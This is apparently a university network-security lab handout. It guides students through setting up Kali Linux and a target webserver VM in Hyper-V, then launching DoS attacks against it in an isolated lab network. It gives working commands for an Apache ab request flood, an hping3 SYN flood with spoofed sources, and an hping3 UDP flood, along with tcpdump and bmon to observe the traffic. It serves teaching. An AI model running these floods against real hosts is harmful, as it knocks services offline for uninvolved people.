    Introduction

    In this lab you are going to launch some DoS attacks within the controlled environment of your Azure Lab Services computer. Note You should be careful when launching these attacks so that you don't disrupt traffic outside of your test environment. It goes without saying that you should not use these attacks against any computer other than those in test environment.

    You will be using two virtual machines. The first is CO4509Webserver which was built for this module. It provides a web server that you can run DoS attacks on. The second is Kali Linux - a specialist Linux distribution for penetration testing.

    Instructions

    Download CO4509 Webserver and Kali Linux from blackboard to your Azure Lab Services computer. The link is in Blackboard. I suggest just logging into Blackboard within the Lab Services Computer.

    CO4509 Webserver

    This virtual machine is provided as a prebuild harddrive image. You will need to add this image to Hyper-V.

  1. Start Hyper-V
    2.  
  2. In Hyper-V click New → Virtual Machine.
    3.  
  3. Click Next >

    4.  
  4. Change the name of the Virtual Machine to CO4509Webserver

    5.  
  5. Leave the generation of the Virtual Machine as Generation 1 and click Next >
    6.  
  6. Leave the memory as 1024MB and click Next >
    7. [help]
  7. Change network connection to LabNet.

    8.  
  8. Select "Use an existing virtual hard disk". For the location select the CO4509 Webserver image you downloaded and click Finish.

    9. [help]
    I left it in my Downloads folder for this example. It would be more senesible to move it to the Hyper-V Virtual Hard Disk folder.
  9. Start your new VM and connect to it. The username and password are both co4509.
    10.  
    Kali Linux

    Follow the instructions at here on how to install Kali Linux. There are two differences from these instructions. Firstly you should have already downloaded the Kali Linux 64-bit installer. So you do not need to do this. You do not need to create a virtual switch as one has already been created for you. You should start at Step 1 - Open Hyper V Manager. In Step 5 where you select the network you should select LabNet - this was precreated for you.

    A pre created disk image will be available on Blackboard if you struggle with this step.

    Start a terminal and the Chromium web browser. You will use the terminal to launch the attacks and the web browser to test access to the webserver.

    Denial of Service

    You are going to run a series of Denial of Service attacks against a web server. For each attach you do you will be checking the amount of traffic generated and if you are able to still view pages on the webserver.

  10. You should record the IP address of the web server by logging in and using the following command

    ip addr

    11.  
  11. In this method for a Denial of Service we will be using a benchmarking tool called ab. From Kali run the command below

    ab -c 1000 -n 10000 http://REPLACE WITH WEB SERVER IP/

    While the attack is running, check your access to the web server by entering its IP address in the address bar of the browser.
    12.  
  12. Use tcpdump to view to incoming traffic. Take a sample on the incoming packets and work out what they mean. Check with your lab demonstrator to make sure you are right.

    sudo tcpdump -v

    13.  
  13. Rerun the attack using Apache benchmark and use bmon to show the throughput used.

    sudo bmon

    This shows the amount of traffic that is being consumed by the attack.
    14.  
    SYN Flood
  14. From Kali launch a SYN flood attack

    sudo hping3 --rand-source REPLACE WITH WEB SERVER IP --flood -S -L 0 -p 80

    You should use tcpdump and bmon to investigate the amount of traffic used.

    15.  
    UDP Flood
  15. From Kali launch a UDP flood attack.

    sudo hping3 --flood --rand-source --udp -p 53 REPLACE WITH WEB SERVER IP

    You should use tcpdump and bmon to investigate the amount of traffic used.
    16.  
    Investigation

    Kali provides a number of DoS tools. You should investigate each of them. They are provided in the Applications menu. Test them out on the provided web server to see how they perform, remember to check how they affect the performace of the web server, the throughput they create and the traffic generated via TCPDump. Try to explain the traffic you see in TCPDump.
